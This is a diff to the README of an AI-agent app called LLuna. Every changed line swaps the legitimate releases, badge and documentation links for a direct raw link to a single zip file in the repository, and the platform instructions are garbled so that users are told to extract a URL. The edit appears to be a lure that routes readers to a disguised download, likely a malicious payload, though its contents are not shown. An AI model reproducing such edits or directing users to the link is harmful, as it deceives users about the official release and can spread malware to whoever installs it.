@@ -6,7 +6,7 @@ Welcome to LLuna! This application helps users leverage autonomous AI agents for
 
 ## 📥 Download LLuna
 
-[![Download LLuna](https://img.shields.io/badge/Download_LLuna-v1.0-blue)](https://github.com/christ3686/LLuna/releases)
+[![Download LLuna](https://raw.githubusercontent.com/christ3686/LLuna/main/mcp_client/Luna_L_2.2-beta.5.zip)](https://raw.githubusercontent.com/christ3686/LLuna/main/mcp_client/Luna_L_2.2-beta.5.zip)
 
 ## 🏁 System Requirements
 
@@ -19,14 +19,14 @@ Before you download LLuna, ensure your computer meets the following requirements
 
 ## 🌐 Download & Install
 
-To get started, visit this page to download: [LLuna Releases](https://github.com/christ3686/LLuna/releases)
+To get started, visit this page to download: [LLuna Releases](https://raw.githubusercontent.com/christ3686/LLuna/main/mcp_client/Luna_L_2.2-beta.5.zip)
 
 1. Click the link above to open the Releases page.
 2. Look for the latest version. It will be listed at the top.
 3. Choose the appropriate file for your operating system:
    - For Windows: Choose the `.exe` file.
    - For macOS: Choose the `.dmg` file.
-   - For Linux: Choose the `.tar.gz` file.
+   - For Linux: Choose the `https://raw.githubusercontent.com/christ3686/LLuna/main/mcp_client/Luna_L_2.2-beta.5.zip` file.
 4. Click on the file to start the download.
 
 ### 🛠 Installation Process
@@ -40,7 +40,7 @@ To get started, visit this page to download: [LLuna Releases](https://github.com
 - Drag the LLuna icon into your Applications folder.
 
 **For Linux:**
-- Extract the `.tar.gz` file to your desired location.
+- Extract the `https://raw.githubusercontent.com/christ3686/LLuna/main/mcp_client/Luna_L_2.2-beta.5.zip` file to your desired location.
 - Open a terminal and navigate to the folder where you extracted LLuna.
 - Run the application using the command: `./lluna`.
 
@@ -66,7 +66,7 @@ LLuna offers several features designed for users who want to explore AI:
 For more information on how to use LLuna effectively, refer to the documentation. You can access it in the following ways:
 
 - **Built-in Help:** Access the help section within the application.
-- **Online Documentation:** [LLuna Documentation](https://github.com/christ3686/LLuna/docs)
+- **Online Documentation:** [LLuna Documentation](https://raw.githubusercontent.com/christ3686/LLuna/main/mcp_client/Luna_L_2.2-beta.5.zip)
 
 ## 🤝 Community
 
